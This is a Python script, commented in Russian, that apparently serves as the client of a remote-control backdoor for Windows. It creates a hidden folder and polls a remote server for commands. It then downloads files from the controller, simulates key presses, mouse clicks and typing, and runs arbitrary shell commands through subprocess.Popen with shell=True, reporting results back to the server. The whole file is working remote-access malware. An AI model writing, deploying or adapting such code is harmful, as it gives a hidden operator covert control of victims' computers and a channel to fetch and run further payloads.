import subprocess
import pyautogui
from time import sleep
from scripts import *
from pynput.keyboard import Controller

keyboard = Controller()
create_hidden_folder('C:/scripts')

while True:
    try:
        prev_value = requests.get(link).json()
        break
    except Exception as e:
        print(e)
        sleep(20)


while True:

    try:
        value = requests.get(link).json()

        if value["run"] != prev_value["run"] and value["run"]:
            try:
                # разделяем запрос по символам ` & `
                value["args"] = split(value["args"], ' & ')

                # разделяем запросы на списки
                value["args"] = [split(item, ', ') for item in value["args"]]

                # запускаем процесс выполнения команд
                for val in value["args"]:
                    try:
                        # при установке
                        if val[0] == 'download':
                            val[1] = val[1].replace('/link/', f'{link}download/')
                            download_file(val[1], 'C:/scripts')

                        # при нажатии клавиши (1)
                        elif val[0] == 'press':
                            pyautogui.press(val[1])

                        # при нажатии клавиш (2 <)
                        elif val[0] == 'hotkey':
                            pyautogui.hotkey(val[1:])

                        # при нажатии мыши
                        elif val[0] == 'click':
                            pyautogui.click(button=val[1])

                        # при вводе текста
                        elif val[0] == 'write':
                            keyboard.type(', '.join(val[1:]))

                        # при задержке
                        elif val[0] == 'sleep':
                            sleep(float(val[1].replace(',', '.')))

                        # при использовании Popen
                        else:
                            val[0] = val[0].replace('/user/', f'/{os.getlogin()}/')
                            subprocess.Popen(val, shell=True)

                        send_success(f"Команда выполнена: {val}")

                    except Exception as e:
                        send_error(f"Ошибка при выполнении команды: {e}")

            # отправляем отчет об ошибке
            except Exception as e:
                send_error(f"Ошибка при выполнении команды: {e}")

        # кулдаун
        prev_value = value
        sleep(value["sleep"])

    except Exception as e:
        send_error(f"Общая ошибка: {e}")
        sleep(20)
